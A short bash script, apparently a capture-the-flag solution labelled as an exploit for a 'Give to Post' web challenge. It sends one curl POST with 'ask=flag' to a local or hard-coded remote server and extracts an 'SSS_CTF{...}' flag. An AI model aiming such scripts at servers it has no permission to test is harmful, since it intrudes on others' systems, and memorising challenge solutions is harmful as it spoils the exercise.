#!/bin/bash
PORT=8085

if [[ $1 == "local" ]]
then
    remote='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
then
    remote='http://141.85.224.118:'$PORT
else
    remote=$1':'$2
fi

# Give to Post
echo "Start exploit for Give to Post"
remote=$remote'/give-to-post/'
flag=$(curl -s --data "ask=flag" -X POST $remote | grep -o "SSS_CTF{.*}")
echo "Flag is $flag"
echo "----------------------------"
